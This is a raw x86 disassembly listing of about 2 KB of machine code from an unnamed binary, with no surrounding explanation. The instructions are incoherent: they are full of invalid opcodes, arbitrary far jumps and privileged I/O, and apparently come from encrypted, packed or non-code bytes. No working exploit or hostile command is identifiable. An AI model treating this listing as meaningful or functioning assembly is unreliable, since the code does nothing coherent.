  407406:	mov    BYTE PTR [esi-0x73a060cc],ch
  40740c:	adc    ebp,0xfc4b31a5
  407412:	push   esp
  407413:	dec    eax
  407414:	std    
  407415:	jg     0x407436
  407417:	(bad)  
  407418:	mov    ebx,0xecf6dad1
  40741d:	call   FWORD PTR [edx]
  40741f:	nop
  407420:	rcr    BYTE PTR [esi+ebp*2+0xf],1
  407424:	xchg   esp,eax
  407425:	jmp    0xfe37:0xbff5d735
  40742c:	cli    
  40742d:	sub    BYTE PTR [eax],cl
  40742f:	jecxz  0x4073da
  407431:	pop    eax
  407432:	jmp    0x4073fa
  407434:	call   DWORD PTR [edx-0x31]
  407437:	loopne 0x4073e4
  407439:	inc    ebp
  40743a:	xchg   ecx,eax
  40743b:	pop    esi
  40743c:	dec    esi
  40743d:	xchg   edx,esp
  40743f:	sbb    bh,BYTE PTR [eax-0x5e9df2ba]
  407445:	jb     0x407476
  407447:	shl    bh,0x63
  40744a:	jg     0x407469
  40744c:	pop    edx
  40744d:	gs xchg edi,eax
  40744f:	xchg   ebx,eax
  407450:	xor    BYTE PTR [eax+0x31],ah
  407453:	aaa    
  407454:	imul   edi,DWORD PTR [edx-0x2e],0x8fcf6580
  40745b:	ret    0xb035
  40745e:	xlat   BYTE PTR ds:[ebx]
  40745f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407460:	es repz pop ebx
  407463:	in     eax,0xf5
  407465:	mov    esp,0xad4bd65b
  40746a:	mov    cl,BYTE PTR [esp+edi*4-0x5a]
  40746e:	push   ebx
  40746f:	pop    ebp
  407470:	mov    BYTE PTR [eax+0x3638fc8a],bh
  407476:	adc    dl,BYTE PTR [ecx+ebp*8+0x37]
  40747a:	das    
  40747b:	fdivrp st(2),st
  40747d:	add    BYTE PTR [ecx+0x63b6dcce],bl
  407483:	dec    esp
  407484:	jbe    0x4074ee
  407486:	sar    DWORD PTR [ecx],1
  407488:	dec    ebx
  407489:	bswap  esi
  40748b:	lods   eax,DWORD PTR ds:[esi]
  40748c:	in     eax,dx
  40748d:	cmc    
  40748e:	iret   
  40748f:	in     eax,dx
  407490:	pop    ebp
  407491:	or     bh,BYTE PTR [eax]
  407493:	popa   
  407494:	fmul   st,st(5)
  407496:	inc    ecx
  407497:	mov    bl,0x4c
  407499:	bound  eax,QWORD PTR [ebp-0x63a8d79a]
  40749f:	scas   eax,DWORD PTR es:[edi]
  4074a0:	adc    BYTE PTR [esi+0x7f],cl
  4074a3:	cs ds jno 0x4074cd
  4074a7:	or     BYTE PTR [ebx+0x33e70746],bh
  4074ad:	xor    eax,0x7abd2d18
  4074b2:	push   cs
  4074b3:	mov    dh,0xe8
  4074b5:	pop    eax
  4074b6:	push   es
  4074b7:	jb     0x4074ef
  4074b9:	int    0x11
  4074bb:	or     BYTE PTR [esi+0x74],ah
  4074be:	ret    0xb3d1
  4074c1:	sar    DWORD PTR [edi+0x2c1e7b33],cl
  4074c7:	cmp    eax,0x5c1d0e34
  4074cc:	push   0x51979b3e
  4074d1:	sub    bl,BYTE PTR [ebp-0x35c7f84b]
  4074d7:	push   eax
  4074d8:	or     ebx,esp
  4074da:	adc    al,BYTE PTR [esi]
  4074dc:	sbb    dh,BYTE PTR [eax+edx*4+0x2c]
  4074e0:	cld    
  4074e1:	repz fmul QWORD PTR [ebp-0x61]
  4074e5:	mov    ebp,0x4b1350c3
  4074ea:	call   FWORD PTR [eax+0x63]
  4074ed:	sub    BYTE PTR [ebp+0x2f6bd628],bh
  4074f3:	popf   
  4074f4:	xchg   ebx,eax
  4074f5:	fwait
  4074f6:	inc    edx
  4074f8:	inc    ebx
  4074f9:	lods   al,BYTE PTR ds:[esi]
  4074fa:	add    dh,BYTE PTR [eax]
  4074fc:	out    dx,al
  4074fd:	push   0xc439eb6c
  407502:	call   0xd0f8:0x1bd79caf
  407509:	xor    DWORD PTR [ecx],edx
  40750b:	fadd   DWORD PTR [edi]
  40750d:	out    0x1c,eax
  40750f:	js     0x407553
  407511:	fwait
  407512:	sbb    BYTE PTR [esi],0xcb
  407515:	fisubr DWORD PTR cs:[edx-0x5dafef04]
  40751c:	idiv   DWORD PTR [ebx+0x51]
  40751f:	dec    ecx
  407520:	hlt    
  407521:	and    al,0xc0
  407523:	test   dl,0x27
  407526:	daa    
  407527:	icebp  
  407528:	sbb    eax,0xa988843a
  40752d:	mov    ecx,ebx
  40752f:	pop    esi
  407530:	fisubr DWORD PTR [eax+ecx*1+0x32]
  407534:	call   0xe4877f84
  407539:	cmp    BYTE PTR [esi],0x85
  40753c:	daa    
  40753d:	call   0x69e09182
  407542:	xor    al,0x6f
  407544:	mov    esi,0xce01b444
  407549:	fld    TBYTE PTR [eax+0x42]
  40754c:	bound  edi,QWORD PTR [ecx-0x796e0d82]
  407552:	lahf   
  407553:	jge    0x4074f9
  407555:	jmp    0xbd6:0x84a400c1
  40755c:	call   0x4fea:0xb09f08d9
  407563:	sub    DWORD PTR [ebp-0x2b14d454],ecx
  407569:	shr    DWORD PTR [edx+0xe],1
  40756c:	(bad)  
  40756d:	shl    BYTE PTR [eax-0x1dbadef7],0x50
  407574:	outs   dx,DWORD PTR ds:[esi]
  407575:	sbb    al,0x20
  407577:	jne    0x407546
  407579:	cmp    eax,0x9d9e253e
  40757e:	xor    bl,bl
  407580:	sbb    esp,DWORD PTR [eax]
  407582:	mov    ebx,0x9447ad7a
  407587:	sub    dl,BYTE PTR ds:0x663c90fa
  40758d:	repz sbb al,0xec
  407590:	call   0x77f8f09f
  407595:	fdivr  DWORD PTR [ebx-0x1056c17b]
  40759b:	sahf   
  40759c:	jns    0x407618
  40759e:	stos   DWORD PTR es:[edi],eax
  40759f:	pusha  
  4075a0:	adc    al,0xc6
  4075a2:	test   al,0xec
  4075a4:	bound  esi,QWORD PTR [esi-0x36]
  4075a7:	sar    edx,cl
  4075a9:	push   esp
  4075aa:	pop    ebp
  4075ab:	pop    ecx
  4075ac:	scas   eax,DWORD PTR es:[edi]
  4075ad:	cmp    ebx,DWORD PTR ds:0x107dcc59
  4075b3:	(bad)  
  4075b5:	xchg   ecx,eax
  4075b6:	ja     0x40761a
  4075b8:	pop    esi
  4075b9:	mov    bl,0xb3
  4075bb:	sbb    BYTE PTR [eax+ebp*4-0xaef3092],bl
  4075c2:	add    al,0x7f
  4075c4:	inc    edi
  4075c5:	aam    0xab
  4075c7:	cmp    edx,0x3354bac2
  4075cd:	iret   
  4075ce:	int3   
  4075cf:	xor    eax,0x19e64c82
  4075d4:	pop    esp
  4075d5:	fsin   
  4075d7:	sub    BYTE PTR [edi],bh
  4075d9:	rol    BYTE PTR fs:[ebp+0x4ba56564],cl
  4075e0:	sahf   
  4075e1:	xor    ebx,edx
  4075e3:	sbb    eax,0x5bec1425
  4075e8:	loop   0x4075d4
  4075ea:	jge    0x4075b2
  4075ec:	loop   0x4075e2
  4075ee:	hlt    
  4075ef:	fdecstp 
  4075f1:	int3   
  4075f2:	ret    0x32ef
  4075f5:	push   cs
  4075f6:	mov    ds:0x5839c20c,al
  4075fb:	gs sbb edx,edx
  4075fe:	xor    DWORD PTR [esi],esi
  407600:	js     0x407616
  407602:	(bad)  
  407603:	mov    al,0x73
  407605:	lods   al,BYTE PTR ds:[esi]
  407606:	sbb    edi,DWORD PTR [ebp-0x24590de6]
  40760c:	xor    al,0x61
  40760e:	pop    ecx
  40760f:	(bad)  
  407610:	cmc    
  407611:	jl     0x4075b9
  407613:	(bad)  
  407614:	fld    QWORD PTR [esi+0x55]
  407617:	jecxz  0x407616
  407619:	mov    ecx,0x1cea49de
  40761e:	lds    ebx,FWORD PTR [ebx-0x66]
  407621:	cs aaa 
  407623:	ins    BYTE PTR es:[edi],dx
  407624:	(bad)  
  407625:	mul    DWORD PTR [edx+0x2b]
  407628:	cld    
  407629:	cs push ebp
  40762b:	dec    ebp
  40762c:	je     0x407647
  40762e:	xor    BYTE PTR [ecx-0x7b19102a],al
  407634:	and    al,BYTE PTR ss:[edx+0x7a157b5e]
  40763b:	dec    esp
  40763c:	mov    esp,0x4aab8cee
  407641:	xor    BYTE PTR [eax+0x2baef87a],dh
  407647:	add    al,0x7f
  407649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40764a:	lea    eax,[ebx-0x65]
  40764d:	and    BYTE PTR ds:0x39451322,dh
  407653:	pusha  
  407654:	adc    al,0x68
  407656:	pop    ebx
  407657:	lds    ecx,FWORD PTR [eax+ecx*1+0x37]
  40765b:	xor    DWORD PTR [ebx+0x39],eax
  40765e:	jmp    ebp
  407660:	test   DWORD PTR [esi-0x40],esp
  407663:	pop    esi
  407664:	dec    edi
  407665:	cs mov esp,0x4117a13b
  40766b:	pusha  
  40766c:	mov    esi,0x3963e34e
  407671:	inc    ebx
  407672:	cmp    al,0xa6
  407674:	or     eax,0x517c9cb2
  407679:	jg     0x407651
  40767b:	neg    esi
  40767d:	push   cs
  40767e:	mov    ds:0xe60f1a4d,eax
  407683:	shr    dl,0x6f
  407686:	call   0xefb6:0xd22c9545
  40768d:	pop    ss
  40768e:	inc    edx
  40768f:	mov    ds:0xec996fab,al
  407694:	mov    ch,BYTE PTR [esi]
  407696:	xchg   esp,eax
  407697:	int    0x68
  407699:	mov    cl,0xba
  40769b:	xor    ecx,DWORD PTR gs:[ebx]
  40769e:	xchg   ebp,eax
  40769f:	jmp    0x4076d1
  4076a1:	sahf   
  4076a2:	push   esp
  4076a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076a4:	mov    al,ds:0xf09f0583
  4076a9:	pop    es
  4076aa:	push   esp
  4076ab:	repnz rcl BYTE PTR [edx],1
  4076ae:	inc    esp
  4076af:	pop    esp
  4076b0:	sub    DWORD PTR [eax+0x4eb66cc],edx
  4076b6:	daa    
  4076b7:	cmc    
  4076b8:	mov    ecx,0x9514e82d
  4076bd:	sub    ebp,0xd54c517f
  4076c3:	(bad)  
  4076c4:	cmc    
  4076c5:	scas   eax,DWORD PTR es:[edi]
  4076c6:	mov    dl,0xc5
  4076c8:	stos   BYTE PTR es:[edi],al
  4076c9:	popa   
  4076ca:	lock xor al,0xf0
  4076cd:	cwde   
  4076ce:	pushf  
  4076cf:	mov    WORD PTR [eax],?
  4076d1:	adc    BYTE PTR [edi-0x5312394c],0x25
  4076d8:	pop    ss
  4076d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076da:	std    
  4076db:	fnstenv [eax-0x58]
  4076de:	and    DWORD PTR [eax-0x25],edi
  4076e1:	xchg   dh,cl
  4076e3:	xchg   edx,eax
  4076e4:	sbb    esp,edx
  4076e6:	clc    
  4076e7:	mov    DWORD PTR [edi+0xd],esi
  4076ea:	in     eax,dx
  4076eb:	pop    ebx
  4076ec:	bound  esi,QWORD PTR [edx-0x59dc72c5]
  4076f2:	jne    0x4076b4
  4076f4:	adc    dh,BYTE PTR [ecx+ecx*2+0x8]
  4076f8:	leave  
  4076f9:	xchg   ecx,eax
  4076fa:	enter  0x6cb7,0x9b
  4076fe:	(bad)
  407701:	sbb    ebx,DWORD PTR [ecx]
  407703:	cmp    dl,BYTE PTR [ebx-0x37]
  407706:	cmp    eax,0xdf829e15
  40770b:	mov    bl,dl
  40770d:	xchg   edi,eax
  40770e:	mov    eax,0x51bb7b04
  407713:	adc    esp,DWORD PTR [edi+0x69]
  407716:	out    0x53,eax
  407718:	test   BYTE PTR [esi],dl
  40771a:	jle    0x40775e
  40771c:	fdivp  st(2),st
  40771e:	scas   al,BYTE PTR es:[edi]
  40771f:	cmp    eax,0xe2fa0e92
  407724:	cmp    bl,ah
  407726:	fs in  al,0x27
  407729:	push   ecx
  40772a:	and    esp,edx
  40772c:	nop
  40772d:	mov    esi,0xeeb2ab35
  407732:	push   esp
  407733:	mul    ch
  407735:	xor    DWORD PTR [eax+0x1447c60b],0x51
  40773c:	dec    edi
  40773d:	cwde   
  40773e:	cmp    edi,DWORD PTR ds:0x852e377e
  407744:	jne    0x40774b
  407746:	jb     0x40775b
  407748:	cmp    DWORD PTR fs:[edx-0x5c],0xd8014989
  407750:	jno    0x4077bd
  407752:	test   eax,0x895f2952
  407757:	int    0x93
  407759:	inc    edx
  40775a:	and    eax,0xd42036bf
  40775f:	cmp    ch,BYTE PTR [eax]
  407761:	dec    esi
  407762:	mov    al,ah
  407764:	jbe    0x9e329f0c
  40776a:	cmp    esi,DWORD PTR [esi+0x265b0653]
  407770:	cmp    ebx,DWORD PTR [eax+0x55]
  407773:	stos   BYTE PTR es:[edi],al
  407774:	inc    edx
  407775:	jmp    0x878:0x38035180
  40777c:	jno    0x40773d
  40777e:	add    eax,0x25868fb3
  407783:	mov    bh,ch
  407785:	pop    esi
  407786:	clc    
  407787:	aad    0x39
  407789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40778a:	cli    
  40778b:	or     bh,dh
  40778d:	xchg   BYTE PTR [ecx-0x39],dh
  407790:	mov    eax,0xd8273fed
  407795:	scas   eax,DWORD PTR es:[edi]
  407796:	sbb    eax,0xd0eef227
  40779b:	adc    al,0xca
  40779d:	pop    eax
  40779e:	sub    eax,0x6064aece
  4077a3:	sbb    cl,BYTE PTR [esp+edx*2]
  4077a6:	push   cs
  4077a7:	sub    bl,BYTE PTR [ebx+0x5]
  4077aa:	std    
  4077ab:	mov    eax,ds:0x8b2b0327
  4077b0:	js     0x407767
  4077b2:	cs jp  0x4077ca
  4077b5:	(bad)
  4077b8:	inc    edi
  4077b9:	loopne 0x4077f6
  4077bb:	sbb    al,0xcf
  4077bd:	loope  0x4077f7
  4077bf:	sbb    BYTE PTR [edx+0x77],0xaf
  4077c3:	jne    0x407780
  4077c5:	nop
  4077c6:	mov    ch,0xb6
  4077c8:	push   edi
  4077c9:	call   0xa175:0x993f065c
  4077d0:	push   ecx
  4077d1:	ret    
  4077d2:	cdq    
  4077d3:	jo     0x407838
  4077d5:	push   0xddfe15c1
  4077da:	jne    0x407830
  4077dc:	call   0x262a:0x14d4a37a
  4077e3:	push   cs
  4077e4:	push   esi
  4077e5:	lods   eax,DWORD PTR ds:[esi]
  4077e6:	out    dx,eax
  4077e7:	out    0xed,al
  4077e9:	pop    edi
  4077ea:	push   esi
  4077eb:	inc    edx
  4077ec:	popa   
  4077ed:	mov    dl,0x1d
  4077ef:	cdq    
  4077f0:	out    dx,eax
  4077f1:	jae    0x40779a
  4077f3:	icebp  
  4077f4:	mov    ecx,0x31fe93be
  4077f9:	out    dx,eax
  4077fa:	and    eax,0xa3584fe3
  4077ff:	mov    ebp,0xefe62915
  407804:	icebp  
  407805:	cmp    DWORD PTR [ebx+0x12],esi
  407808:	mov    al,ds:0x5b396c6
  40780d:	sbb    ebp,ecx
  40780f:	dec    edx
  407810:	or     BYTE PTR [ebx],bl
  407812:	dec    ecx
  407813:	shl    DWORD PTR [edi+0x40f97afa],0xd6
  40781a:	pop    es
  40781b:	and    esp,ecx
  40781d:	jae    0x4077dc
  40781f:	out    dx,al
  407820:	push   ebx
  407821:	jne    0x40789c
  407823:	adc    eax,0x3e36b0d0
  407828:	ss idiv dh
  40782b:	lahf   
  40782c:	and    DWORD PTR [edi+0x5ec5972a],edi
  407832:	sbb    ebx,DWORD PTR [edx]
  407834:	out    0x5a,eax
  407836:	sahf   
  407837:	or     eax,0xf56a7141
  40783c:	and    DWORD PTR [ebx-0x40],ebp
  40783f:	cmp    eax,ebx
  407841:	pushf  
  407842:	addr16 xchg esi,eax
  407844:	jmp    0xc210431
  407849:	xchg   ecx,eax
  40784a:	sahf   
  40784b:	xor    al,0xce
  40784d:	mov    al,0x91
  40784f:	add    al,0x3b
  407851:	aas    
  407852:	adc    DWORD PTR [ebx],ecx
  407854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407855:	loope  0x4077e1
  407857:	jnp    0x4077f5
  407859:	pop    edx
  40785a:	mov    dl,0x43
  40785c:	sbb    al,0x61
  40785e:	data16 mov ds,WORD PTR [ebp-0x24]
  407862:	sub    al,0x3e
  407864:	in     al,0x94
  407866:	ins    BYTE PTR es:[edi],dx
  407867:	fist   WORD PTR [ebx]
  407869:	mov    bl,0x57
  40786b:	(bad)  
  40786c:	xor    ah,ah
  40786e:	jns    0x40786f
  407870:	xchg   esp,eax
  407871:	adc    eax,0x78dd82f3
  407876:	push   ss
  407877:	mov    dh,BYTE PTR [edi-0x14]
  40787a:	sub    ecx,edi
  40787c:	minps  xmm1,XMMWORD PTR [eax]
  40787f:	sbb    BYTE PTR [edi],dh
  407881:	push   0x21
  407883:	icebp  
  407884:	shl    ch,1
  407886:	in     al,0x2b
  407888:	jecxz  0x407842
  40788a:	cmp    edi,DWORD PTR [esi]
  40788c:	fwait
  40788d:	gs jo  0x407812
  407890:	add    ecx,DWORD PTR [ebx+0x1465d48b]
  407896:	(bad)  
  407897:	jnp    0x4078b7
  407899:	push   0xdf5fcc24
  40789e:	mov    ebp,DWORD PTR [ebx]
  4078a0:	mov    ch,0x91
  4078a2:	mov    ecx,0xa98394f1
  4078a7:	jecxz  0x40785a
  4078a9:	gs mov edi,0xc118a02b
  4078af:	jle    0x40785c
  4078b1:	and    DWORD PTR [ecx],edi
  4078b3:	pop    ebx
  4078b4:	lea    ebx,[ebx+0x1]
  4078b7:	lods   eax,DWORD PTR ds:[esi]
  4078b8:	repnz retf 
  4078ba:	pusha  
  4078bb:	pushf  
  4078bc:	mov    DWORD PTR [edi-0x4b05d09b],ebx
  4078c2:	sub    esi,DWORD PTR [edx-0x28bb5010]
  4078c8:	or     bh,BYTE PTR [edx]
  4078ca:	adc    esp,DWORD PTR fs:[edx+eax*2-0x4d]
  4078cf:	in     al,0x6a
  4078d1:	mov    WORD PTR [ebx-0x6a],ds
  4078d4:	bnd jns 0x407924
  4078d7:	aas    
  4078d8:	loope  0x407910
  4078da:	dec    WORD PTR [eax]
  4078dd:	xor    BYTE PTR [eax-0x746d0bc8],bl
  4078e3:	sub    cl,BYTE PTR [ecx-0x1e]
  4078e6:	and    ebx,DWORD PTR [ecx+0x50]
  4078e9:	sub    dl,BYTE PTR [ebx]
  4078eb:	aam    0x5f
  4078ed:	test   BYTE PTR [ebp-0x4],ah
  4078f0:	rcl    DWORD PTR [edx+0x4bcc6542],0xc3
  4078f7:	std    
  4078f8:	test   eax,0xbf54c753
  4078fd:	xor    BYTE PTR [edx],bh
  4078ff:	xor    dl,BYTE PTR [edi+0x4f]
  407902:	repz push 0x20dab99
  407908:	test   al,0x11
  40790a:	dec    ebx
  40790b:	jg     0x4078b3
  40790d:	or     al,0xd5
  40790f:	mov    ch,0x52
  407911:	and    ch,bl
  407913:	push   ebx
  407914:	xor    DWORD PTR [esi],0x7c0e7cba
  40791a:	pop    ecx
  40791b:	and    DWORD PTR [eax+0x79],ebx
  40791e:	adc    bl,BYTE PTR [ebx]
  407920:	and    edi,DWORD PTR [eax-0x34512848]
  407926:	ins    BYTE PTR es:[edi],dx
  407927:	dec    esp
  407928:	rcr    dl,cl
  40792a:	icebp  
  40792b:	inc    esi
  40792c:	ja     0x407926
  40792e:	dec    ebp
  40792f:	out    0x34,eax
  407931:	jb     0x40796c
  407933:	mov    cl,dl
  407935:	mov    bh,0x67
  407937:	daa    
  407938:	adc    eax,0x9c969ddb
  40793d:	lock in al,0x5e
  407940:	mov    ?,WORD PTR [esi+esi*2]
  407943:	test   BYTE PTR ds:0x7f847185,0xe1
  40794a:	(bad)  
  40794b:	sahf   
  40794c:	mov    ds:0xd41fe897,al
  407951:	retf   
  407952:	loop   0x4078f0
  407954:	fisub  WORD PTR cs:[ecx]
  407957:	cmp    cl,BYTE PTR [eax+eiz*1+0x24301b86]
  40795e:	bound  ebp,QWORD PTR [edi-0x4e4a9911]
  407964:	retf   
  407965:	jb     0x407937
  407967:	add    ecx,DWORD PTR [ecx+0x4b]
  40796a:	scas   eax,DWORD PTR es:[edi]
  40796b:	out    0x8,al
  40796d:	clc    
  40796e:	xchg   BYTE PTR [edx-0x5da08821],dh
  407974:	or     eax,0x21eae8fd
  407979:	jnp    0x407972
  40797b:	shl    ch,1
  40797d:	test   ax,0xe714
  407981:	push   ebp
  407982:	xchg   edx,eax
  407983:	arpl   WORD PTR [ebp+edx*1-0x26],cx
  407987:	fwait
  407988:	inc    edi
  407989:	dec    esp
  40798a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40798b:	fistp  DWORD PTR [ebx]
  40798d:	leave  
  40798e:	adc    dl,cl
  407990:	pop    ecx
  407991:	sub    eax,0x7419e696
  407996:	in     eax,dx
  407997:	mov    esi,0x9e86ec93
  40799c:	out    dx,al
  40799d:	(bad)  
  40799e:	or     edi,DWORD PTR [ebx+0x26edd475]
  4079a4:	pop    ecx
  4079a5:	int3   
  4079a6:	fs push ecx
  4079a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079a9:	mov    edx,0x1b9bac34
  4079ae:	sahf   
  4079af:	dec    edx
  4079b0:	sahf   
  4079b1:	sti    
  4079b2:	sbb    DWORD PTR [eax+esi*4],0x4c4162b0
  4079b9:	jmp    0x13b3c9f2
  4079be:	(bad)  
  4079bf:	aad    0x7c
  4079c1:	dec    esi
  4079c2:	(bad)  
  4079c4:	pop    esi
  4079c5:	pop    eax
  4079c6:	dec    edx
  4079c7:	retf   
  4079c8:	cdq    
  4079c9:	sub    esp,DWORD PTR [eax+eax*4+0x5]
  4079cd:	sub    bl,ah
  4079cf:	aas    
  4079d0:	imul   eax,edx,0xffffff98
  4079d3:	mov    bh,0x88
  4079d5:	push   cs
  4079d6:	aam    0x9a
  4079d8:	cmovb  ebx,DWORD PTR [ebx]
  4079db:	(bad)  
  4079dd:	stos   BYTE PTR es:[edi],al
  4079de:	outs   dx,BYTE PTR ds:[esi]
  4079df:	clc    
  4079e0:	mov    al,ds:0x2ed424d4
  4079e5:	outs   dx,DWORD PTR ds:[esi]
  4079e6:	sbb    eax,0x5fc50977
  4079eb:	std    
  4079ec:	sbb    ch,BYTE PTR [ebx-0xe632379]
  4079f2:	loop   0x407a50
  4079f4:	ins    BYTE PTR es:[edi],dx
  4079f5:	cmp    ebp,eax
  4079f7:	mov    ecx,0xcaa04ff5
  4079fc:	add    BYTE PTR [edi],dl
  4079fe:	lea    ebp,ds:0x1554e9d6
  407a04:	fwait
  407a05:	and    eax,DWORD PTR [esi+0x6d]
  407a08:	xchg   ecx,eax
  407a09:	xchg   ebx,eax
  407a0a:	inc    ebp
  407a0b:	retf   
  407a0c:	xchg   ebp,eax
  407a0d:	add    ebx,edi
  407a0f:	cdq    
  407a10:	mov    dh,0x9a
  407a12:	ret    
  407a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a14:	(bad)  
  407a15:	mov    esi,0xef077384
  407a1a:	lea    ecx,cs:[ebp+ebx*4-0x13dd9b4e]
  407a22:	jne    0x407a63
  407a24:	dec    esp
  407a25:	imul   edi,DWORD PTR [edi-0x1b],0xffffffe2
  407a29:	and    BYTE PTR [edx],bh
  407a2b:	push   esp
  407a2c:	push   ds
  407a2d:	popf   
  407a2e:	call   0x626464dc
  407a33:	add    cl,BYTE PTR [ecx+0x63096888]
  407a39:	mov    BYTE PTR [esi-0x3fce316b],dl
  407a3f:	in     eax,dx
  407a40:	(bad)  
  407a41:	je     0x407a77
  407a43:	int3   
  407a44:	push   eax
  407a45:	mov    ah,0x4b
  407a47:	inc    eax
  407a48:	pop    ebp
  407a49:	pusha  
  407a4a:	inc    ebp
  407a4b:	mov    cl,0x9f
  407a4d:	cmp    esi,edi
  407a4f:	and    eax,0xef20dfbc
  407a54:	sbb    al,BYTE PTR [ebp+0x60]
  407a57:	xchg   esp,eax
  407a58:	repz sub eax,DWORD PTR [ebx+0x0]
  407a5c:	ds into 
  407a5e:	fcmovb st,st(1)
  407a60:	call   0xc5755c28
  407a65:	cmp    ch,ah
  407a67:	repz sbb al,0x16
  407a6a:	stos   BYTE PTR es:[edi],al
  407a6b:	sbb    al,0xc5
  407a6d:	sub    eax,0xd45aeff7
  407a72:	das    
  407a73:	das    
  407a74:	xchg   ebp,eax
  407a75:	addr16 dec esi
  407a77:	in     eax,dx
  407a78:	fs mov ebp,0x9ab00a33
  407a7e:	cmp    esi,DWORD PTR [ebx-0x4f002f7d]
  407a84:	jns    0x407aa0
  407a86:	dec    edx
  407a87:	jle    0x407ada
  407a89:	in     al,0xa8
  407a8b:	push   es
  407a8c:	int3   
  407a8d:	mov    ah,0xd1
  407a8f:	mov    ds:0xb74ee49c,eax
  407a94:	sbb    eax,0x5f9bfa5d
  407a99:	gs fst st(3)
  407a9c:	scas   eax,DWORD PTR es:[edi]
  407a9d:	xor    eax,DWORD PTR [eax-0x60092856]
  407aa3:	test   ch,dl
  407aa5:	sub    dl,BYTE PTR [eax]
  407aa7:	test   eax,0x2a4749f
  407aac:	sub    ecx,ebp
  407aae:	lods   eax,DWORD PTR ds:[esi]
  407aaf:	(bad)  
  407ab0:	cld    
  407ab1:	xchg   esi,eax
  407ab2:	lahf   
  407ab3:	inc    ecx
  407ab4:	or     BYTE PTR [ebx],0xa4
  407ab7:	xlat   BYTE PTR ds:[ebx]
  407ab8:	ret    0x9e69
  407abb:	jg     0x407acd
  407abd:	nop
  407abe:	jg     0x407adb
  407ac0:	sbb    al,0x25
  407ac2:	out    dx,eax
  407ac3:	pop    ebx
  407ac4:	push   0xffffff91
  407ac6:	jbe    0x407ac8
  407ac8:	or     edi,0xffffffd9
  407acb:	adc    BYTE PTR [ebp-0x136e5acf],bl
  407ad1:	(bad)  
  407ad2:	pop    ebp
  407ad3:	add    ebx,DWORD PTR [eax+0x34d5431]
  407ad9:	jns    0x407aa0
  407adb:	pop    ebx
  407adc:	adc    DWORD PTR [edi+0xde68d59],esp
  407ae2:	je     0x407b1f
  407ae4:	push   ds
  407ae5:	repz dec edi
  407ae7:	push   es
  407ae8:	cmp    bh,ch
  407aea:	dec    edx
  407aeb:	addr16 push esi
  407aed:	aaa    
  407aee:	retfw  0xd1f2
  407af2:	lea    esi,[edx]
  407af4:	inc    esi
  407af5:	stc    
  407af6:	pop    eax
  407af7:	inc    edi
  407af8:	mov    edi,0x78ff1bed
  407afd:	push   esi
  407afe:	push   ss
  407aff:	xchg   ebx,eax
  407b00:	(bad)  
  407b01:	fstp   DWORD PTR [ecx+0x3b568a25]
  407b07:	out    0xbc,eax
  407b09:	mov    esp,0xce2c4ae6
  407b0e:	jl     0x407b6f
  407b10:	repz sbb al,0x16
  407b13:	shl    DWORD PTR [edi+ebp*8],1
  407b16:	or     al,0x5b
  407b18:	outs   dx,BYTE PTR ds:[esi]
  407b19:	out    0x94,al
  407b1b:	add    ah,al
  407b1d:	sbb    eax,DWORD PTR [edx-0x7e]
  407b20:	jl     0x407b89
  407b22:	add    ah,dh
  407b24:	add    al,ah
  407b26:	sub    eax,0x38d5902e
  407b2b:	jmp    0xa12ae2d1
  407b30:	jnp    0x407b77
  407b32:	popf   
  407b33:	fwait
  407b34:	gs retf 0x162
  407b38:	sub    al,0x94
  407b3a:	iret   
  407b3b:	pop    ecx
  407b3c:	mov    ch,0xaf
  407b3e:	adc    ah,BYTE PTR [esi-0x59]
  407b41:	dec    esi
  407b42:	push   0xbc1ef6b8
  407b47:	mov    edx,DWORD PTR [ecx+0x5a]
  407b4a:	ins    BYTE PTR es:[edi],dx
  407b4b:	xor    BYTE PTR [ebx-0x8b51a72],ch
  407b51:	loope  0x407b7c
  407b53:	rol    BYTE PTR [edi+0x9],0xe0
  407b57:	add    eax,DWORD PTR [edi+0x57b3fce3]
  407b5d:	pop    edx
  407b5e:	je     0x407bdf
  407b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b61:	lock cwde 
  407b63:	jae    0x407ae5
  407b65:	dec    eax
  407b66:	pop    ds
  407b67:	in     eax,dx
  407b68:	test   al,0xba
  407b6a:	call   0x908bdfb
  407b6f:	push   edi
  407b70:	lods   eax,DWORD PTR ds:[esi]
  407b71:	in     eax,0x96
  407b73:	in     al,0x72
  407b75:	jge    0x407b9d
  407b77:	add    eax,0x88d110b
  407b7c:	ins    BYTE PTR es:[edi],dx
  407b7d:	cs mov ch,0xf2
  407b80:	outs   dx,DWORD PTR ds:[esi]
  407b81:	loop   0x407bef
  407b83:	mov    cs,WORD PTR cs:[ebx+eax*1]
  407b87:	xor    eax,DWORD PTR [ecx-0x5f9bc244]
  407b8d:	jle    0x407b45
  407b8f:	aam    0xdc
  407b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b92:	std    
  407b93:	xor    eax,0xfdd1e4c5
  407b98:	pop    ss
  407b99:	mov    ds:0x8cc603b7,al
  407b9e:	push   edx
  407b9f:	sbb    DWORD PTR ds:0x17b9f225,0xa
  407ba6:	gs pop ss
  407ba8:	test   al,0x38
  407baa:	push   0x334b8f8d
  407baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bb0:	aad    0x8a
  407bb2:	(bad)  
  407bb3:	fidivr DWORD PTR [ecx+0x365ac794]
  407bb9:	sbb    DWORD PTR [ebx-0x72d40eb5],0x41aa4115
  407bc3:	ret    0x519a
  407bc6:	xchg   ebp,eax
  407bc7:	es in  al,dx
  407bc9:	xchg   edx,eax
  407bca:	clc    
  407bcb:	cmp    ebx,DWORD PTR [ebx]
  407bcd:	fcomp  DWORD PTR [eax-0x52]
  407bd0:	xchg   ecx,eax
  407bd1:	stc    
  407bd2:	xlat   BYTE PTR ds:[ebx]
  407bd3:	(bad)  
  407bd4:	mov    edi,0x460c2bf0
  407bd9:	push   esp
  407bda:	ins    DWORD PTR es:[edi],dx
  407bdb:	mov    edi,0x4792be0b
  407be0:	aad    0xb9
  407be2:	aas    
  407be3:	shl    ah,cl
  407be5:	lods   al,BYTE PTR ds:[esi]
